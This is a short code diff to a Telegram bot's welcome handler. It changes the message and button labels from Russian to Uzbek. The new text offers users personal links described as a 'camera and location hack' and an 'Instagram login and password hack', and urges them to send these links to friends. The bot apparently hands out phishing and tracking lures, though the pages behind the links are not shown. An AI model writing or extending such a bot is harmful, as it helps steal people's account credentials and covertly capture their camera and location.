@@ -109,13 +109,13 @@ bot.start(async (ctx) => {
   const referralLink = `https://${HOST}/r/${id}`;
 
   await ctx.reply(
-    `✨ *Добро пожаловать!*\n\n🔗 *Ваша персональная ссылка:*\n${referralLink}\n\n📷 *Instagram (перейти):*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
+    `✨ *Xush Kelibsiz! Bu Havolalarni Dostlaringizga Yuboring *\n\n🔗 *Kamera va Lokatsiyan Hack havolasi:*\n${referralLink}\n\n📷 *Instagram Login va Parol hack havolasi:*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
     {
       parse_mode: "Markdown",
       reply_markup: {
         inline_keyboard: [
-          [{ text: "📷 Открыть Instagram", url: personalInstaLink }],
-          [{ text: "🔗 Открыть ссылку (share)", url: referralLink }],
+          [{ text: "📷 Instagram hack havola", url: personalInstaLink }],
+          [{ text: "🔗 Kamera va Lokatsiya hack havola", url: referralLink }],
         ]
       }
     }
